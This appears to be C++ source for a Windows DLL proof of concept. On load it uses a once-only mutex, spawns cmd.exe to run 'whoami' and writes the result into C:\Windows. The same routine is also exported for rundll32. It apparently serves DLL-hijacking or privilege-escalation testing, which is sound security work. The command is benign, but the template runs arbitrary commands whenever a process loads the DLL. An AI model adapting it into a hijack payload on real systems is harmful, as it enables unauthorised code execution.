// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>

BOOL TestMutex() {

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\brianski");
    if (hMutex != NULL)
        return FALSE;
    
    hMutex = CreateMutexA(&sa, TRUE, "Global\\brianski");

    if (hMutex == NULL)
        return FALSE;
    
    return TRUE;
}

void DoTheThing() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wchar_t cmdArgs[] = L"C:\\WINDOWS\\system32\\cmd.exe /c whoami > C:\\Windows\\Testercatstory.txt";

    CreateProcess(TEXT("C:\\WINDOWS\\system32\\cmd.exe"), cmdArgs, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/// <summary>
/// For use with Rundll32.exe
/// eg. rundll32.exe .\DllfuncTest.dll DoIt
/// </summary>
/// <returns></returns>
extern "C" __declspec(dllexport) void DoIt()
{
    DoTheThing();
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (TestMutex())
            DoTheThing();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

